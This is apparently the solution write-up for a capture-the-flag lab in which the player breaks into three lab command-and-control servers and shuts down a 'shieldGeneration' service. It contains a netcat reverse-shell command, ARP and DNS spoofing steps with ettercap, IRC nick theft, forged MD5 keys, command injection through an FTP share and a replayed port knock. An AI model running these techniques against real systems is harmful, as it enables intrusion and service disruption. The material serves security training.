# Shields Down! Solution

For this challenge, you will need to determine how to gain access to each of the Command and Control (C2) servers to then pivot, gain access, and shut down the Shield Generation services located on each generator by
any means necessary.

You will need to do complete network enumeration to get an understanding of the `user` network that your machine is located in. 
Some of the C2 servers can be accessed by analyzing scans taken of the machine and using the information.
Some C2 servers will require you to be able to spoof the network in order to capture the traffic that is going on.


## Goal

To turn off the `shieldGeneration` services located on each of the generator VMs on the other side of each perspective C2 server.

To complete your objective, you can do any of the following to pass:
- turn off generator VM
- disable/mess up networking
- turn off service via `sudo systemctl stop shieldGeneration.service`


## Network Enumeration

### Scanning method

`nmap -A 101.200.55.0/24` will scan every machine in the `user` net.
Nmap can also be leveraged to scan each of the C2 servers to help determine what they are doing/ have vulnerable.

This will show that the firewall is at `101.200.55.1`, which is whats being used to connect to each the three(3) C2 servers you found previously, they are:
- 1st C2 server: `44.106.35.11`
- 2nd C2 server: `44.2.22.75`
- 3rd C2 server: `44.91.84.131`

### Spoofing Method

To do the spoofing i used `ettercap`, although you may use any tool you feel comfortable with. In order to do it with Ettercap, follow these steps:
1. Edit `/etc/ettercap/etter.conf` and set these:
    - Ec_uid = 0
    - Ec_gid = 0
    - Uncomment all 4 IPv4 and IPv6 iptables rules under “Linux” section at bottom
2. run command `sudo bash -c 'echo “1” > /proc/sys/net/ipv4/ip_forward'`
3. Edit /etc/ettercap/etter.dns
    - Insert these lines at the bottom so that any traffic intended for the host `gateway` is sent to your machine  
        - gateway.us	PTR	*host Kali IP*
        - *gateway.us	A	*host kali ip*
        - *gateway		A	*host kali Ip*
4. Run ettercap with command
-    `Sudo ettercap -T -Q -i eth0 -P dns_spoof -M arp /// ///`
5. Let it run for a bit and then it should start showing that it is spoofing for the IP entered in `etter.dns`
6. Open wireshark and start capturing traffic


## Accessing C2 servers

Assuming Network Enumeration is completed....

### Accessing Generator1 using IRC connection to CC1 (Command and Control 1 w/ Shield Generator, )

The IP of this C2 server is `44.106.35.11`

You've discovered IRC traffic as well as hosts using the IRC service. From this information, you should be able to pull some information regarding the user.
You should discover the IRC Nickname `xray` being used by one of the hosts on the `user` net. 
You will then need to ether steal the accepted Nickname when the user is `offline` or monitor plaintext IRC traffic to discover automated service granting xray shell access via IRC.

Log in to irc.us
/list, then /join #shieldGen
if the search window is empty, adjust parameters to show channels with 1 to 9999 users
Watch user activity, note several user accounts join and leave at regular intervals
Steal a nick when user is offline (any will work, using alpha as an example): /nick alpha
Wait for a private message from a user with nick ircbox-?????? (where ? is a digit)
This message grants a shell on CC1, but it is limited. For a better shell, issue these commands:
Open a terminal on Kali and run: nc -lvp 4444
In IRC, send the ircbox-?????? user: mknod /tmp/backpipe p
In IRC, send the ircbox-?????? user: /bin/sh 0</tmp/backpipe | nc kali-workstation-ip 4444 1>/tmp/backpipe
Your terminal will now be a shell on CC1 with more capabilities, better speed, and less likelihood of getting booted than the IRC shell
First, cat mythic_admin_password.txt and note the contents (it should be tartanstartans). You will need this for Generator 3.
Use ip addr to see the network interfaces and assigned IP addresses. Note that one address has a /30 subnet mask. This means there can be only ONE other address in that subnet: 100.99.98.130
Note also that the .ssh/known_hosts file is not empty.
ssh 100.99.98.130

You are now logged in to Generator1. Disable the `shieldGeneration` service using any of the methods mentioned above.

###  Accessing Generator2 by gaining access to TCP Server on CC2 (Command and Control 2 w/ Shield Generator)

The IP of this C2 server is `44.2.22.75`

If you run an `nmap` scan against the C2 server, you should find some useful information. You should discover:
 - The C2 server has a open listening socket located on port `55555`.
 - That it is running an FTP server.

If you analyze the traffic, you will find that there is one machine connecting to the port found above and is sending a message using a specific format and contains specific keys that need to follow a format in order to 
be accepted. Also you will find that there is various FTP traffic going to that C2 server as well, although you will not be able to connect to it using any credentials found in packet capture.

Once you look into the TCP traffic going to port `55555`, you should find that there is a message being sent in `json` format. Within the message, there are specific keys being used.
They are labeled as `key1` and `key2`. Where `key1` looks to be a random string of length 8 and `key2` looks to be another random string with length of 32. 

If you attempt to intercept and use any of the keys being sent in the chaff traffic, you will find that it has already been used and thus you will have to make your own.

You should be able to determine the connection between the two keys, and that connection is that the `key2` value is the MD5 hash of the string value sent with `key1`. 
With that, you should then start to craft your own message following this format in order to successfully connect to the C2 server. 

The only requirements is that the string used for `key1` must be at least 8 characters and that the MD5 sum of the `key1` sent will match the MD5 sum value sent in `key2`.
If done correctly, you will get a response from the C2 server that will contain the credentials of one of its users. This message will say:

`0rang3>human5`

Using this, SSH into the C2 server to gain access. 

The next step should be for you to check out the FTP server and determine what is occurring when the other users are connecting. You can use the command:

`net share` 

Which will then show you the location of the share being hosted, which is located at `C:\Users\ftp\Documents`.

If you watch this folder for a bit, you should begin to understand what is occurring. 

Files are getting dropped in, from there they will then get replaced with a new file. This new file will have the same name but have `_output` appended to them, and then after
a short time they will be removed. 

If you look at the files contents, you will see that the files are being executed, the output of the commands ran are being saved in the new file with `_output` appended, then 
they are cleaned up. The only important thing to note is that every file dropped in follows the format of having `cmd = `where the string of your command you want executed follows.
There is only 1 entry per line.

This should be your hint that the `generator` has this share mounted and this is the method that they implemented to pass commands onto the C2 server. You can craft your own file
and drop it in this folder.

You should then be able to send any command to the generator and attempt to shutdown the `shieldGeneration` service.

#### Watchdog for 2nd C2

After sending various commands via the FTP share or gaining access to the `generator` via changing credentials, you should discover the `watchdog` service is 
keeping the shieldGeneration service up.

You can turn this service off with `sudo systemctl stop watchdog.service`, which will then allow you to keep the `shieldGenerator` service off as well.

You can also turn the VM off, disrupt networking, or anything else that would halt any kind of connectivity.

###  Accessing Generator3 by bypassing port knocking defense on CC3 (Command and Control 3 w/ Shield Generator)

The IP of this C2 server is `44.91.84.143`

Monitor traffic and note the unusual SYN packets at ports 40128, 20256, and 30512 to IP 44.91.84.131, followed by TLS/SSL traffic at port 7443

Use nmap to mimic the port knock sequence:

 - nmap -Pn --host-timeout 201 --max-retries 0  -p 40128 44.91.84.131
 - nmap -Pn --host-timeout 201 --max-retries 0  -p 20256 44.91.84.131
 - nmap -Pn --host-timeout 201 --max-retries 0  -p 30512 44.91.84.131

Immediately connect to https://44.91.84.131:7443 using a web browser (Firefox)
The credentials are mythic_admin and tartanstartans
password was found during CC1 section
username is alluded to in password file from CC1 and can also be found in the mythic documentation via Google
Click Operational Views -> Active Callbacks
Click top callback icon (probably 6) with sub-10-second "Last Checkin" time
A proprietary shell interface will appear at the bottom of the browser. This will allow you to issue commands to the generator 3 system. Kill the shield generator process according to Nick's instructions.

You are now logged in to Generator and must turn off the `shieldGenerator` service.

#### Watchdog for 3rd C2

After some time, you should realize that you haven't received points for turning off the `shieldGenerator` service. 

After more analyzing of the `generator3` VM, you should see that there is another VM on their internal network that seems to be keeping an eye on the `shieldGenerator` service and is
re-enabling it whenever it sees its down.

Because of this, there are fewer things you can do to make sure it stays down, they are:
- Turn off VM
- Block all IPs via `iptables`
- Wipe networking

You choice.

## Grading

Grading checks will be occurring automatically throughout your challenge. It will be based on if you are able to get the `shieldGenerator.service` turned off, which can be 
completed many different ways as discussed above.
